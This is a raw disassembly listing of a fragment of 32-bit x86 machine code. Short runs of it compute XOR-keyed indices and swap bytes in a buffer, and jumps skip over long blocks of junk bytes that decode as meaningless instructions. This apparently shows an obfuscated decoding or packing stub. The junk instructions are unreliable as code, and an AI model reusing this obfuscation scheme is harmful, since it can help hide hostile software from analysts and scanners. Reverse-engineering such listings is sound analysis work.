  408509:	push   cs
  40850a:	mov    bh,0xe1
  40850c:	pop    ecx
  40850d:	sti    
  40850e:	dec    ecx
  40850f:	jmp    0xbef48298
  408514:	push   0x6d
  408516:	loopne 0x408522
  408518:	dec    eax
  408519:	xor    eax,DWORD PTR [eax]
  40851b:	adc    dl,al
  40851d:	cmp    dl,BYTE PTR [ecx+edx*8+0x7f9980ce]
  408524:	or     ch,BYTE PTR [ebp+0x63]
  408527:	push   0xa29b3cfc
  40852c:	pop    edx
  40852d:	mov    ss,WORD PTR cs:[edi+0xc]
  408531:	lock push edx
  408533:	fwait
  408534:	test   DWORD PTR [edi+0x20ce1370],esi
  40853a:	xchg   DWORD PTR [edi+0x28],edi
  40853d:	adc    al,0x7c
  40853f:	push   0x36
  408541:	mov    DWORD PTR ds:0x1c61c040,ebx
  408547:	mov    ecx,0x2e503e2f
  40854c:	jnp    0x408518
  40854e:	jae    0x4084f7
  408550:	loop   0x40858a
  408552:	shr    BYTE PTR [ebx-0x72],1
  408555:	cmc    
  408556:	sbb    ah,BYTE PTR [esi+0x1954f954]
  40855c:	dec    edi
  40855d:	fidivr WORD PTR [ebx+0x78]
  408560:	mov    bl,0x2d
  408562:	je     0x408545
  408564:	pop    es
  408565:	inc    edi
  408566:	lock mov BYTE PTR fs:[ebx+0x9],bh
  40856b:	int    0x42
  40856d:	loop   0x408563
  40856f:	pop    ebp
  408570:	mov    ebp,0xb9eec7be
  408575:	hlt    
  408576:	xchg   ebp,eax
  408577:	dec    edx
  408578:	outs   dx,BYTE PTR ds:[esi]
  408579:	sbb    BYTE PTR [edx-0x10],dl
  40857c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40857d:	iret   
  40857e:	ss pop esi
  408580:	and    al,al
  408582:	push   eax
  408583:	sbb    edi,DWORD PTR [edx+0x3b2ed4fe]
  408589:	fimul  DWORD PTR [edi]
  40858b:	xchg   DWORD PTR [eax],ecx
  40858d:	add    BYTE PTR [eax],al
  40858f:	add    BYTE PTR [ebx-0x271633ab],cl
  408595:	add    DWORD PTR [eax],eax
  408597:	add    BYTE PTR [ebx+0x7d8bc455],cl
  40859d:	cld    
  40859e:	xor    edx,eax
  4085a0:	xor    edi,eax
  4085a2:	add    edx,ecx
  4085a4:	add    edi,ecx
  4085a6:	imul   edx,edi
  4085a9:	mov    edi,DWORD PTR [ebp-0x8]
  4085ac:	mov    ebx,DWORD PTR [ebp-0x10]
  4085af:	sub    ebx,edi
  4085b1:	jmp    0x408762
  4085b6:	add    eax,0x7405640f
  4085bb:	jne    0x408622
  4085bd:	(bad)  
  4085bf:	mov    eax,0x9e66353f
  4085c4:	xor    DWORD PTR [ecx],edx
  4085c6:	loope  0x40859f
  4085c8:	jle    0x408648
  4085ca:	mov    bh,BYTE PTR [edi+0x7e]
  4085cd:	jle    0x40860d
  4085cf:	pop    ecx
  4085d0:	lods   al,BYTE PTR ds:[esi]
  4085d1:	inc    edx
  4085d2:	xlat   BYTE PTR ds:[ebx]
  4085d3:	cwde   
  4085d4:	into   
  4085d5:	(bad)
  4085d8:	or     eax,0x540cd913
  4085dd:	pop    esi
  4085de:	sub    al,0xcc
  4085e0:	mov    al,ds:0xbeef3ef5
  4085e5:	mov    eax,0xab50257a
  4085ea:	cli    
  4085eb:	add    DWORD PTR [ebp+eiz*4+0x1444c49c],0x7959f818
  4085f6:	mov    ch,0x96
  4085f8:	jmp    0x4085da
  4085fa:	pop    ecx
  4085fb:	outs   dx,DWORD PTR ds:[esi]
  4085fc:	push   ebp
  4085fd:	inc    esp
  4085fe:	jmp    0x40865e
  408600:	or     dh,BYTE PTR [ecx]
  408602:	pop    ds
  408603:	xor    BYTE PTR [ebx+0x2fec1638],dl
  408609:	retf   0xa23a
  40860c:	(bad)  
  40860d:	jmp    0x1e91c117
  408612:	xor    ecx,DWORD PTR [edx-0x79]
  408615:	popa   
  408616:	data16 cli 
  408618:	pusha  
  408619:	jno    0x4085c8
  40861b:	repnz fiadd WORD PTR [ebp-0x16]
  40861f:	fwait
  408620:	lods   al,BYTE PTR ds:[esi]
  408621:	or     DWORD PTR [edx-0x22a63512],ebx
  408627:	xor    esp,edi
  408629:	mov    eax,ds:0x980644eb
  40862e:	xor    BYTE PTR [edx-0x5d],0x74
  408632:	(bad)  
  408633:	xor    al,0xfd
  408635:	pop    ebx
  408636:	inc    ebx
  408637:	test   eax,0x215ec528
  40863c:	aas    
  40863d:	xor    bl,al
  40863f:	xor    BYTE PTR [eax+0x8ba3bb7],bh
  408645:	sar    BYTE PTR [esp+edx*4+0x7cd12f2a],cl
  40864c:	rol    bl,cl
  40864e:	cmp    DWORD PTR [edi+0x5316e30b],ebx
  408654:	lar    esi,WORD PTR [ebp-0x1cb3d7f4]
  40865b:	imul   edx,DWORD PTR [esi+0x1b5bcc45],0x11a2b765
  408665:	fs sbb eax,0x5f443b6b
  40866b:	ss jecxz 0x4085fb
  40866e:	rcl    DWORD PTR [ebx],1
  408670:	(bad)  
  408671:	push   ss
  408672:	popf   
  408673:	mul    BYTE PTR [eax+0x6b92452f]
  408679:	inc    ebp
  40867a:	getsec 
  40867c:	push   ds
  40867d:	inc    esp
  40867e:	inc    edx
  40867f:	or     al,0x2
  408681:	mov    esp,0x2f0b03ed
  408686:	xor    ah,BYTE PTR [ebp+edi*2-0x1b]
  40868a:	sar    DWORD PTR [edi-0x24a18b64],0xc5
  408691:	jge    0x4086d6
  408693:	cmp    bl,BYTE PTR [ebx+0x3a]
  408696:	xor    DWORD PTR [esi],edx
  408698:	jmp    0xb8e1db91
  40869d:	repz call 0x244c:0x497ab7dd
  4086a5:	test   DWORD PTR [edx-0x611bfcc6],edx
  4086ab:	xor    eax,0x3cdd4967
  4086b0:	xor    ch,cl
  4086b2:	add    esp,DWORD PTR [ebp-0x72]
  4086b5:	dec    edx
  4086b6:	in     eax,dx
  4086b7:	cwde   
  4086b8:	inc    edi
  4086b9:	repnz sbb DWORD PTR [esi-0x38],ebp
  4086bd:	ror    cl,1
  4086bf:	push   ss
  4086c0:	sbb    BYTE PTR [ecx-0x205d2541],cl
  4086c6:	xchg   esp,eax
  4086c7:	cli    
  4086c8:	and    eax,0x1339904f
  4086cd:	lods   al,BYTE PTR ds:[esi]
  4086ce:	inc    eax
  4086cf:	lock dec esi
  4086d1:	or     DWORD PTR ds:0x42e5e565,ebx
  4086d7:	(bad)  
  4086d8:	fsubr  st(5),st
  4086da:	js     0x408716
  4086dc:	pop    ds
  4086dd:	outs   dx,BYTE PTR ds:[esi]
  4086de:	mov    WORD PTR [edi],?
  4086e0:	mov    edi,0xc9a73f5e
  4086e5:	loopne 0x4086b4
  4086e7:	pop    edx
  4086e8:	jo     0x408739
  4086ea:	sahf   
  4086eb:	mov    dl,0xa1
  4086ed:	jbe    0x408682
  4086ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4086f0:	add    BYTE PTR [edi-0x479417d5],dh
  4086f6:	mov    dl,0xdb
  4086f8:	sub    DWORD PTR [ecx-0x79737677],eax
  4086fe:	aad    0xf8
  408700:	test   cl,ch
  408702:	das    
  408703:	adc    DWORD PTR [edx+0x3ed7b7b4],ebp
  408709:	je     0x408747
  40870b:	aaa    
  40870c:	popf   
  40870d:	out    0xb8,al
  40870f:	jns    0x4086ea
  408711:	arpl   WORD PTR [ebp+0xd],ax
  408714:	jnp    0x4086e7
  408716:	xchg   BYTE PTR [ebx],cl
  408718:	pop    edx
  408719:	scas   al,BYTE PTR es:[edi]
  40871a:	mov    dh,0x70
  40871c:	adc    DWORD PTR [esi-0x7e],0x7f7372cb
  408723:	and    DWORD PTR [edx+0x35],esi
  408726:	in     al,0x5f
  408728:	or     DWORD PTR [ebp+eiz*8-0x35],esi
  40872c:	xchg   edi,eax
  40872d:	xchg   esp,eax
  40872e:	ins    BYTE PTR es:[edi],dx
  40872f:	xchg   ebp,eax
  408730:	or     al,0x10
  408732:	ds iret 
  408734:	dec    ebp
  408735:	push   edx
  408736:	call   0x8b26:0x5599a678
  40873d:	sbb    edi,DWORD PTR [ebx+0x2f45d35f]
  408743:	inc    esp
  408744:	dec    ecx
  408745:	jle    0x4086e6
  408747:	jl     0x40871a
  408749:	jno    0x408735
  40874b:	jg     0x408765
  40874d:	je     0x408794
  40874f:	jmp    0x8dac:0xe63a4d8d
  408756:	ins    DWORD PTR es:[edi],dx
  408757:	cmp    BYTE PTR [edi],ah
  408759:	dec    ecx
  40875a:	mov    ds:0x7dff281d,eax
  40875f:	call   0xda7b907a
  408764:	mov    edx,DWORD PTR [ebp-0x38]
  408767:	jbe    0x408770
  40876d:	mov    edx,DWORD PTR [ebp-0x3c]
  408770:	mov    edi,DWORD PTR [ebp-0x4]
  408773:	xor    edi,eax
  408775:	xor    edx,eax
  408777:	add    edi,ecx
  408779:	add    edx,ecx
  40877b:	imul   edx,edi
  40877e:	mov    DWORD PTR [ebp+0xc],edx
  408781:	mov    edx,DWORD PTR [ebp+0xc]
  408784:	mov    DWORD PTR [ebp-0x24],edx
  408787:	mov    edx,DWORD PTR [ebp-0x8]
  40878a:	add    edx,DWORD PTR [ebp-0x40]
  40878d:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  408794:	mov    DWORD PTR [ebp-0x1c],edx
  408797:	mov    DWORD PTR [ebp-0xc],0xf89c8532
  40879e:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  4087a5:	mov    edx,DWORD PTR [ebp-0x18]
  4087a8:	xor    edx,eax
  4087aa:	add    edx,ecx
  4087ac:	jmp    0x408819
  4087b1:	mov    edx,DWORD PTR [ebp-0x18]
  4087b4:	xor    edx,eax
  4087b6:	add    edx,DWORD PTR [ebp-0x14]
  4087b9:	mov    edi,DWORD PTR [ebp-0x1c]
  4087bc:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  4087c3:	mov    BYTE PTR [ebp+0xf],dl
  4087c6:	mov    edx,DWORD PTR [ebp-0xc]
  4087c9:	xor    edx,eax
  4087cb:	add    edx,DWORD PTR [ebp-0x14]
  4087ce:	mov    edi,DWORD PTR [ebp-0x1c]
  4087d1:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  4087d8:	mov    BYTE PTR [ebp+0xb],dl
  4087db:	mov    dl,BYTE PTR [ebp+0xf]
  4087de:	mov    edi,DWORD PTR [ebp-0xc]
  4087e1:	xor    edi,eax
  4087e3:	add    edi,DWORD PTR [ebp-0x14]
  4087e6:	mov    ebx,DWORD PTR [ebp-0x1c]
  4087e9:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  4087f0:	mov    dl,BYTE PTR [ebp+0xb]
  4087f3:	mov    edi,DWORD PTR [ebp-0x18]
  4087f6:	xor    edi,eax
  4087f8:	add    edi,DWORD PTR [ebp-0x14]
  4087fb:	mov    ebx,DWORD PTR [ebp-0x1c]
  4087fe:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  408805:	mov    edx,DWORD PTR [ebp-0x44]
  408808:	mov    edi,DWORD PTR [ebp-0xc]
  40880b:	xor    edx,eax
  40880d:	xor    edi,eax
  40880f:	add    edx,ecx
  408811:	add    edi,ecx
  408813:	imul   edx,edi
  408816:	add    edx,DWORD PTR [ebp-0x14]
  408819:	mov    DWORD PTR [ebp-0x14],edx
  40881c:	mov    edx,DWORD PTR [ebp-0xc]
  40881f:	mov    edi,DWORD PTR [ebp-0x24]
  408822:	xor    edx,eax
  408824:	add    edx,ecx
  408826:	imul   edx,edi
  408829:	mov    edi,DWORD PTR [ebp-0xc]
  40882c:	xor    edi,eax
  40882e:	sub    edx,edi
  408830:	mov    edi,DWORD PTR [ebp-0xc]
  408833:	mov    ebx,DWORD PTR [ebp-0x14]
  408836:	jmp    0x4089e7
  40883b:	mov    ebx,0x516c50c8
  408840:	je     0x4088a5
  408842:	jmp    0xab204522
  408847:	mov    ah,0xd
  408849:	mov    edx,0x7ed57d21
  40884e:	jle    0x4087da
  408850:	jg     0x4088d0
  408852:	jle    0x4088be
  408854:	pushf  
  408855:	push   edx
  408856:	pop    eax
  408857:	add    DWORD PTR [edi],esi
  408859:	mov    esi,0x79252236
  40885e:	jmp    0x2548c2bb
  408863:	cli    
  408864:	and    ah,BYTE PTR [ebp+0x6c]
  408867:	ins    BYTE PTR es:[edi],dx
  408868:	pop    ebx
  408869:	leave  
  40886a:	fs cld 
  40886c:	jb     0x408804
  40886e:	pusha  
  40886f:	sub    eax,0x2c3b0b26
  408874:	xchg   ebp,eax
  408875:	jmp    0x42c3:0x5186b784
  40887c:	idiv   BYTE PTR [ebx]
  40887e:	stos   BYTE PTR es:[edi],al
  40887f:	popa   
  408880:	xor    eax,esi
  408882:	or     eax,0x4da3be14
  408887:	popf   
  408888:	xchg   ecx,eax
  408889:	sbb    dl,al
  40888b:	rcl    BYTE PTR [edi-0x43a6f3f0],cl
  408891:	clc    
  408892:	cdq    
  408893:	mov    ebx,esp
  408895:	xor    eax,0x63326e7f
  40889a:	out    dx,al
  40889b:	js     0x408888
  40889d:	mov    ds:0x9fea54f4,al
  4088a2:	(bad)  
  4088a3:	mov    bh,0xcc
  4088a5:	scas   eax,DWORD PTR es:[edi]
  4088a6:	jp     0x40885a
  4088a8:	imul   DWORD PTR [ebx-0x60645edf]
  4088ae:	out    dx,al
  4088af:	mov    edi,0xc0e72a2c
  4088b4:	mov    bh,0xd
  4088b6:	cmp    edx,edi
  4088b8:	jp     0x4088f3
  4088ba:	inc    eax
  4088bb:	out    dx,eax
  4088bc:	mov    DWORD PTR [eax],ecx
  4088be:	add    bl,BYTE PTR [ebx]
  4088c0:	jg     0x408930
  4088c2:	pavgw  mm5,mm1
  4088c5:	repnz scas al,BYTE PTR es:[edi]
  4088c7:	div    BYTE PTR [eax-0x74]
  4088ca:	jae    0x408943
  4088cc:	cs test al,0xad
  4088cf:	jne    0x408920
  4088d1:	cmc    
  4088d2:	pop    esp
  4088d3:	mov    ebp,esp
  4088d5:	test   al,0x66
  4088d7:	or     BYTE PTR [ebx],0xdf
  4088da:	dec    esp
  4088db:	fiadd  WORD PTR [ecx]
  4088dd:	mov    WORD PTR [ecx-0x5b60cf20],es
  4088e3:	xchg   ecx,eax
  4088e4:	arpl   dx,cx
  4088e6:	mov    ah,0xd4
  4088e8:	pushf  
  4088e9:	in     al,0x22
  4088eb:	xchg   ebx,eax
  4088ec:	out    dx,eax
  4088ed:	mov    DWORD PTR [esp+edi*8-0x14483db6],edi
  4088f4:	loope  0x40895f
  4088f6:	cmp    al,0x66
  4088f8:	mov    edx,0x66e9ef33
  4088fd:	scas   eax,DWORD PTR es:[edi]
  4088fe:	push   ebp
  4088ff:	push   ecx
  408900:	lods   al,BYTE PTR ds:[esi]
  408901:	mov    WORD PTR [ebp+0x55],ds
  408904:	(bad)  
  408905:	retf   
  408906:	inc    esp
  408907:	mov    dh,0x85
  408909:	outs   dx,DWORD PTR ds:[esi]
  40890a:	imul   ebp,DWORD PTR [edx+0x52],0xf2e1992e
  408911:	lea    ebx,[ebx]
  408913:	jo     0x40896e
  408915:	sti    
  408916:	push   edi
  408917:	push   cs
  408918:	mov    esi,0x63bffd5b
  40891d:	jno    0x408923
  40891f:	bound  esi,QWORD PTR [esi]
  408921:	out    dx,eax
  408922:	leave  
  408923:	xor    eax,0xa75bae90
  408928:	or     edi,DWORD PTR [edx-0x2afe88dd]
  40892e:	popf   
  40892f:	mov    edi,DWORD PTR [ebx+0x49d7953d]
  408935:	push   ds
  408936:	inc    ebx
  408937:	retf   0x10e7
  40893a:	enter  0xd84c,0x23
  40893e:	add    al,0x19
  408940:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408941:	idiv   BYTE PTR [ebx]
  408943:	pop    ds
  408944:	mov    ds:0xe7f13978,eax
  408949:	sbb    BYTE PTR [esi],0x8d
  40894c:	scas   eax,DWORD PTR es:[edi]
  40894d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40894e:	cli    
  40894f:	popf   
  408950:	inc    esp
  408951:	sub    ebx,DWORD PTR [ebx-0x9]
  408954:	and    ecx,ebp
  408956:	nop
  408957:	scas   al,BYTE PTR es:[edi]
  408958:	test   dh,0x9
  40895b:	pop    ss
  40895c:	add    ecx,DWORD PTR [esi+0x3ba84d2c]
  408962:	jle    0x40895c
  408964:	dec    eax
  408965:	mov    al,dh
  408967:	push   edi
  408968:	mov    ebx,DWORD PTR [ebp-0x20]
  40896b:	sbb    dl,BYTE PTR [edi-0xbc0e74]
  408971:	adc    ebx,DWORD PTR [ebx]
  408973:	test   al,0x3a
  408975:	push   esi
  408976:	sahf   
  408977:	aam    0xa9
  408979:	add    edx,esp
  40897b:	pusha  
  40897c:	pop    ss
  40897d:	and    DWORD PTR [edi+0x20cfe927],eax
  408983:	popf   
  408984:	xor    DWORD PTR [edx-0x531db071],edx
  40898a:	add    BYTE PTR [esi-0x5731ec3f],al
  408990:	cli    
  408991:	std    
  408992:	outs   dx,DWORD PTR ds:[esi]
  408993:	mov    bl,0x33
  408995:	int3   
  408996:	daa    
  408997:	mov    BYTE PTR [esp+ecx*1],cl
  40899a:	inc    esi
  40899b:	dec    esi
  40899c:	in     eax,0x1c
  40899e:	push   ebp
  40899f:	xchg   esi,eax
  4089a0:	js     0x408a1f
  4089a2:	sbb    esp,ecx
  4089a4:	popf   
  4089a5:	lds    esi,FWORD PTR [edx+0x76]
  4089a8:	or     ecx,DWORD PTR [esi]
  4089aa:	mov    edi,0x87315e9d
  4089af:	sub    DWORD PTR [edi-0x22781bec],ebp
  4089b5:	dec    edi
  4089b6:	in     eax,dx
  4089b7:	lea    eax,[esp+esi*1+0x40c1bc4e]
  4089be:	push   es
  4089bf:	cwde   
  4089c0:	and    BYTE PTR [ecx+0xe],ch
  4089c3:	clc    
  4089c4:	sahf   
  4089c5:	pusha  
  4089c6:	pop    es
  4089c7:	adc    al,0x33
  4089c9:	mov    edi,0x402d9e33
  4089ce:	call   0x150324be
  4089d3:	je     0x408975
  4089d5:	inc    ebp
  4089d6:	adc    BYTE PTR [ebx+eiz*1-0x5f],ch
  4089da:	(bad)  
  4089db:	fwait
  4089dc:	push   edx
  4089dd:	popa   
  4089de:	popf   
  4089df:	(bad)  
  4089e0:	or     esp,eax
  4089e2:	sbb    eax,0xd8fed884
  4089e7:	xor    edi,eax
  4089e9:	add    edi,ecx
  4089eb:	imul   edi,ebx
  4089ee:	mov    ebx,DWORD PTR [ebp-0x18]
  4089f1:	xor    ebx,eax
  4089f3:	sub    edx,ecx
  4089f5:	jmp    0x408ba6
  4089fa:	dec    DWORD PTR [edx-0x5a]
  4089fd:	xor    eax,0x708df173
  408a02:	xchg   esp,eax
  408a03:	lea    ebx,[ecx+0xd]
  408a06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a07:	or     DWORD PTR [eax+0x7ed289b6],ebx
  408a0d:	jle    0x408999
  408a0f:	jg     0x408a8f
  408a11:	jle    0x408a90
  408a13:	push   eax
  408a14:	mov    dh,0x34
  408a16:	add    edx,DWORD PTR [edx]
  408a18:	mov    esi,0xf4e0da87
  408a1d:	dec    DWORD PTR [eax+esi*1+0x62]
  408a21:	ja     0x408a34
  408a23:	sub    ch,BYTE PTR [eax]
  408a25:	mov    DWORD PTR [edi+edi*2-0x3b],esi
  408a29:	cli    
  408a2a:	mov    ch,0x7e
  408a2c:	xchg   ecx,eax
  408a2d:	mov    cl,0x3a
  408a2f:	add    edi,DWORD PTR [ebx]
  408a31:	cmp    DWORD PTR [edi-0x258da089],ebp
  408a37:	xchg   cl,ch
  408a39:	jmp    0x408a57
  408a3b:	fistp  DWORD PTR [edi+ebx*1-0x5f78b7ba]
  408a42:	aam    0x60
  408a44:	xchg   al,ah
  408a46:	pop    esp
  408a47:	fsub   DWORD PTR [ebx]
  408a49:	add    ebx,DWORD PTR [eax+0x156822d]
  408a4f:	and    eax,esp
  408a51:	dec    eax
  408a52:	sahf   
  408a53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a54:	adc    eax,0x5e67c6ce
  408a59:	ins    DWORD PTR es:[edi],dx
  408a5a:	pop    ecx
  408a5b:	data16 jmp 0x408abc
  408a5e:	aaa    
  408a5f:	mov    edi,0x14e4566b
  408a64:	add    ecx,ebx
  408a66:	ss je  0x408a4b
  408a69:	jno    0x408a74
  408a6b:	sub    ah,ah
  408a6d:	jge    0x408a34
  408a6f:	dec    esp
  408a70:	ds adc ecx,eax
  408a73:	mov    edx,edx
  408a75:	dec    ebp
  408a76:	or     al,0xf9
  408a78:	xor    DWORD PTR [esi],ebx
  408a7a:	sbb    edx,ebx
  408a7c:	shl    BYTE PTR [edx-0x522a3a28],1
  408a82:	cmp    eax,0x598de3ec
  408a87:	test   cl,bh
  408a89:	bound  esi,QWORD PTR [ebx]
  408a8b:	sbb    eax,0xc83f4778
  408a90:	mov    WORD PTR [ecx-0x70e2c444],gs
  408a96:	popf   
  408a97:	cmp    al,0xca
  408a99:	imul   edx,DWORD PTR [ebx],0x5727d48
  408a9f:	sbb    ah,al
  408aa1:	jbe    0x408a52
  408aa3:	cld    
  408aa4:	or     eax,0x5f13a829
  408aa9:	dec    esp
  408aaa:	(bad)  
  408aab:	into   
  408aac:	push   cs
  408aad:	inc    ecx
  408aae:	inc    edi
  408aaf:	mov    esi,0xba365106
  408ab4:	add    cl,0xbb
  408ab7:	lods   eax,DWORD PTR ds:[esi]
  408ab8:	inc    eax
  408ab9:	inc    edi
  408aba:	adc    cl,al
  408abc:	mov    cl,0x47
  408abe:	popa   
  408abf:	into   
  408ac0:	ins    BYTE PTR es:[edi],dx
  408ac1:	sbb    edx,DWORD PTR [ecx+ecx*8+0x57]
  408ac5:	neg    ecx
  408ac7:	push   0x19
  408ac9:	push   ebp
  408aca:	and    DWORD PTR [eax+eiz*1+0x825a6d7],ebp
  408ad1:	and    al,BYTE PTR [edx+0x32e68f96]
  408ad7:	mov    ebp,0xc39f5c34
  408adc:	das    
  408add:	stos   BYTE PTR es:[edi],al
  408ade:	fld    TBYTE PTR [edx-0x7a]
  408ae1:	lock std 
  408ae3:	xchg   ecx,eax
  408ae4:	repz jmp 0xdeceb89b
  408aea:	fbld   TBYTE PTR [edx]
  408aec:	mov    cl,0x47
  408aee:	jmp    0x408b3b
  408af0:	add    DWORD PTR [edx-0x64f8dbfe],edx
  408af6:	jno    0x408a89
  408af8:	or     esi,0x9408f81d
  408afe:	adc    edx,esp
  408b00:	add    DWORD PTR [esp+ecx*8],esp
  408b03:	(bad)  
  408b04:	xlat   BYTE PTR ds:[ebx]
  408b05:	inc    edx
  408b06:	in     eax,0x2e
  408b08:	pop    esp
  408b09:	fnsave ds:0xed23f127
  408b0f:	ins    DWORD PTR es:[edi],dx
  408b10:	fucomip st,st(0)
  408b12:	sahf   
  408b13:	fdiv   QWORD PTR [edx-0x34841954]
  408b19:	mov    al,0x55
  408b1b:	jo     0x408b87
  408b1d:	ins    BYTE PTR es:[edi],dx
  408b1e:	dec    esi
  408b1f:	push   eax
  408b20:	ins    BYTE PTR es:[edi],dx
  408b21:	mov    eax,ds:0x30306236
  408b26:	out    0xd,eax
  408b28:	aad    0xd1
  408b2a:	add    BYTE PTR [esi],bh
  408b2c:	jns    0x408af2
  408b2e:	mov    ebx,0xff40d430
  408b33:	cmp    BYTE PTR [esp+edx*8],0xd3
  408b37:	sbb    BYTE PTR [ebx+ecx*2],0x22
  408b3b:	sbb    dh,BYTE PTR [ebx+0x4ffae916]
  408b41:	aad    0xfa
  408b43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b44:	mov    ds:0x319f8fa8,eax
  408b49:	inc    esp
  408b4a:	jbe    0x408b51
  408b4c:	cld    
  408b4d:	cdq    
  408b4e:	sbb    esi,ebp
  408b50:	mov    eax,0xe55b2dbf
  408b55:	xchg   edx,eax
  408b56:	pusha  
  408b57:	lds    edx,FWORD PTR [edi]
  408b59:	or     esi,DWORD PTR [edx]
  408b5b:	stc    
  408b5c:	push   esp
  408b5d:	sbb    DWORD PTR [edx+0x5],edi
  408b60:	pop    ebx
  408b61:	ret    
  408b62:	xchg   ebx,eax
  408b63:	mov    BYTE PTR [edx+0x35],ah
  408b66:	sbb    esp,DWORD PTR [ecx+0x12ce65a0]
  408b6c:	test   BYTE PTR [ebx],ah
  408b6e:	pop    edx
  408b6f:	test   edi,ebp
  408b71:	pop    eax
  408b72:	hlt    
  408b73:	into   
  408b74:	mov    al,ds:0xcc294d1
  408b79:	or     eax,0x4ac280cb
  408b7e:	jbe    0x408bc8
  408b80:	out    dx,eax
  408b81:	ds xchg edx,eax
  408b83:	pop    esp
  408b84:	call   0x9d99bb33
  408b89:	push   edx
  408b8a:	cdq    
  408b8b:	xor    DWORD PTR [eax*1-0x3c50537],esi
  408b92:	hlt    
  408b93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b94:	jmp    0x491a:0x7cbeed62
  408b9b:	ficomp WORD PTR [ecx]
  408b9d:	jo     0x408b80
  408b9f:	push   esi
  408ba0:	and    BYTE PTR [edx+0x24],ch
  408ba3:	(bad)  
  408ba5:	inc    ebp
  408ba6:	lea    edi,[edi+ebx*1+0x32729b]
  408bad:	cmp    edi,edx
  408baf:	jbe    0x4087b1
  408bb5:	mov    edx,DWORD PTR [ebp-0xc]
  408bb8:	mov    edi,DWORD PTR [ebp-0x24]
  408bbb:	xor    edx,eax
  408bbd:	add    edx,ecx
  408bbf:	imul   edx,edi
  408bc2:	mov    edi,DWORD PTR [ebp-0x18]
  408bc5:	xor    edi,eax
  408bc7:	jmp    0x408d78
  408bcc:	and    eax,0x71ffb36e
  408bd1:	inc    ebx
  408bd2:	xor    DWORD PTR [edx+eiz*8-0xd],esi
  408bd6:	ret    
  408bd7:	das    
  408bd8:	xor    al,0xe6
  408bda:	jne    0x408bec
  408bdc:	and    eax,0x8a7e7ed0
  408be1:	jg     0x408c61
  408be3:	jle    0x408c1f
  408be5:	and    eax,DWORD PTR [ebx+ebx*1+0x5a8025a7]
  408bec:	mov    ds:0x5536f9e9,al
  408bf1:	mov    al,ds:0x9b7b8f72
  408bf6:	dec    ebp
  408bf7:	jns    0x408beb
  408bf9:	cs js  0x408c5f
  408bfc:	mov    bh,0x47
  408bfe:	call   0x2ef0:0x5a95db01
  408c05:	push   cs
  408c06:	mov    DWORD PTR [ebx+0x29],esp
  408c09:	imul   ecx,DWORD PTR [ebx-0x2665a0b5],0xffffff94
  408c10:	or     eax,edx
  408c12:	fbstp  TBYTE PTR [ecx-0x2d905519]
  408c18:	mov    ebp,0x81d28c27
  408c1d:	fs nop
  408c1f:	int    0x23
  408c21:	push   0x5b
  408c23:	jge    0x408ca4
  408c25:	jae    0x408bfd
  408c27:	shl    BYTE PTR [edx+esi*4-0x65ab589f],cl
  408c2e:	sub    edi,ebp
  408c30:	daa    
  408c31:	xchg   ebp,eax
  408c32:	adc    al,0x4d
  408c34:	jmp    edi
  408c36:	es iret 
  408c38:	bound  eax,QWORD PTR [esi+0x50]
  408c3b:	sahf   
  408c3c:	jne    0x408c25
  408c3e:	pushf  
  408c3f:	push   0x7e
  408c41:	in     al,dx
  408c42:	scas   al,BYTE PTR es:[edi]
  408c43:	stos   BYTE PTR es:[edi],al
  408c44:	inc    eax
  408c45:	sar    BYTE PTR [ebp+0x15],cl
  408c48:	and    DWORD PTR [edi+0x11d80ba8],edi
  408c4e:	add    ebx,esi
  408c50:	addr16 popa 
  408c52:	sbb    DWORD PTR [esi-0x3cd89830],0xffffff9e
  408c59:	mov    bl,0x96
  408c5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c5c:	add    esp,edi
  408c5e:	xor    DWORD PTR ds:0x27eebd90,eax
  408c64:	jne    0x408cbc
  408c66:	pop    ebx
  408c67:	imul   bl
  408c69:	pop    ss
  408c6a:	pop    edi
  408c6b:	push   ds
  408c6c:	inc    edx
  408c6d:	(bad)  
  408c6e:	push   ss
  408c6f:	or     eax,0x95d036f0
  408c74:	sbb    BYTE PTR [ecx+0xd],dl
  408c77:	pushf  
  408c78:	das    
  408c79:	push   esi
  408c7a:	into   
  408c7b:	jl     0x408c8f
  408c7d:	popf   
  408c7e:	xor    bh,BYTE PTR [esi]
  408c80:	jae    0x408c73
  408c82:	xor    al,0x3e
  408c84:	cs repnz sbb ebp,edx
  408c88:	dec    eax
  408c89:	push   esi
  408c8a:	sar    BYTE PTR [edx],0xfa
  408c8d:	dec    ebp
  408c8e:	jecxz  0x408d0f
  408c90:	xchg   edi,eax
  408c91:	les    ebp,FWORD PTR [esi-0x5ecc4dfa]
  408c97:	or     al,0x19
  408c99:	(bad)  [ebp-0x2a]
  408c9c:	mov    edx,0x6f88ba3b
  408ca1:	mov    edi,0x5f3e7f5e
  408ca6:	push   edi
  408ca7:	rcl    bh,0xec
  408caa:	jmp    0x2457:0x57c7baa7
  408cb1:	push   ecx
  408cb2:	jnp    0x408c3a
  408cb4:	mov    DWORD PTR [ebx-0x1d50ffe5],edi
  408cba:	jns    0x408caa
  408cbc:	data16 mov BYTE PTR [edx+0x58300a78],cl
  408cc3:	setge  ah
  408cc6:	adc    eax,0xebbb8e21
  408ccb:	dec    edi
  408ccc:	dec    ecx
  408ccd:	cmp    DWORD PTR [eax+0x9665818],edx
  408cd3:	test   ah,dl
  408cd5:	mov    eax,ds:0xdfe8b936
  408cda:	icebp  
  408cdb:	cmc    
  408cdc:	rcl    BYTE PTR [eax+edi*8],cl
  408cdf:	ficomp WORD PTR [eax+eiz*2]
  408ce2:	ficom  DWORD PTR [edx]
  408ce4:	pop    edx
  408ce5:	retf   0xcd4a
  408ce8:	test   eax,0xf17c25f1
  408ced:	mov    dh,0x28
  408cef:	push   edi
  408cf0:	jmp    0x3eef:0x3d6d4e80
